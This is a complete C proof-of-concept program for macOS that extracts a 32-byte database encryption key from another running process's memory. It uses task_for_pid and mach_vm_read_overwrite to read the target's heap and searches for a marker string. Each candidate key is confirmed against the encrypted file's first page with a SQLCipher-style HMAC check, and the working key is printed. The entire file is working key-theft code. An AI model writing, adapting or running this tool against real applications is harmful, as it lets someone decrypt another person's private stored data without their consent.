// clang poc.c -o dumpkey -O3 -flto

#include <CommonCrypto/CommonCrypto.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <stdio.h>

#define DBPAGE_SIZE 1024
#define KEY_SIZE 32
#define SALT_SIZE 16
#define HMAC_SIZE 20
#define IV_SIZE 16
#define AES_BLOCK_SIZE 16

bool testkey(const unsigned char *page, const unsigned char *key) {
  if (!page || !key)
    return false;

  unsigned char mac_salt[SALT_SIZE];
  for (int i = 0; i < SALT_SIZE; i++)
    mac_salt[i] = page[i] ^ 0x3A;

  unsigned char mac_key[KEY_SIZE];

  CCKeyDerivationPBKDF(kCCPBKDF2, (const char *)key, KEY_SIZE, mac_salt,
                       SALT_SIZE, kCCPRFHmacAlgSHA1, 2, mac_key, KEY_SIZE);

  int reserve = ((IV_SIZE + HMAC_SIZE + AES_BLOCK_SIZE - 1) / AES_BLOCK_SIZE) *
                AES_BLOCK_SIZE;
  int end = DBPAGE_SIZE - reserve + IV_SIZE;

  CCHmacContext hmacContext;
  CCHmacInit(&hmacContext, kCCHmacAlgSHA1, mac_key, KEY_SIZE);
  CCHmacUpdate(&hmacContext, page + SALT_SIZE, end - SALT_SIZE);

  unsigned char page_no[4] = {1, 0, 0, 0};
  CCHmacUpdate(&hmacContext, page_no, 4);

  unsigned char hmac_result[HMAC_SIZE];
  CCHmacFinal(&hmacContext, hmac_result);

  return memcmp(hmac_result, page + end, HMAC_SIZE) == 0;
}

int dumpkey(pid_t pid, const char *filename, char *outkey) {
  mach_port_name_t target_task;
  kern_return_t kr;
  kr = task_for_pid(mach_task_self(), pid, &target_task);
  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "%s (%d)\n", mach_error_string(kr), kr);
    return -1;
  }

  unsigned char page[DBPAGE_SIZE];
  FILE *fp = fopen(filename, "rb");
  if (!fp || fread(page, 1, DBPAGE_SIZE, fp) != DBPAGE_SIZE) {
    fprintf(stderr, "failed to read db file\n");
    if (fp)
      fclose(fp);
    return -1;
  }
  fclose(fp);

  mach_vm_address_t address = 0;
  mach_vm_size_t size;
  vm_region_extended_info_data_t info;
  mach_msg_type_number_t infoCnt = VM_REGION_EXTENDED_INFO_COUNT;
  mach_port_t object_name;
  unsigned char pattern[9] = {0x72, 0x74, 0x72, 0x65, 0x65,
                              0x5F, 0x69, 0x33, 0x32};

  while (1) {
    kr = mach_vm_region(target_task, &address, &size, VM_REGION_EXTENDED_INFO,
                        (vm_region_info_t)&info, &infoCnt, &object_name);
    if (kr != KERN_SUCCESS)
      break;

    if ((info.protection & VM_PROT_READ) && (info.protection & VM_PROT_WRITE) &&
        (info.user_tag == VM_MEMORY_MALLOC_NANO)) {

      unsigned char *data = malloc(size);

      mach_vm_size_t outsize = 0;
      kr = mach_vm_read_overwrite(target_task, address, size,
                                  (mach_vm_address_t)data, &outsize);
      if (kr != KERN_SUCCESS) {
        free(data);
        break;
      }

      unsigned char *pos = data, *end = pos + outsize;
      while ((pos = memmem(pos, end - pos, pattern, 9))) {
        unsigned char *key = pos + 24;
        if (key + KEY_SIZE > end)
          break;

        if (testkey(page, key)) {
          for (int i = 0; i < KEY_SIZE; i++)
            sprintf(outkey + i * 2, "%02x", key[i]);
          free(data);
          return 0;
        }

        pos++;
      }
      free(data);
    }
    address += size;
  }

  return -1;
}

int main(int argc, char *argv[]) {
  if (argc < 3) {
    fprintf(stderr, "Usage: %s <pid> <dbfile>\n", argv[0]);
    return -1;
  }

  pid_t pid = atoi(argv[1]);

  char key[100] = {0};
  if (dumpkey(pid, argv[2], key) == 0) {
    printf("key: %s\n", key);
  } else {
    printf("not found key\n");
  }

  return 0;
}
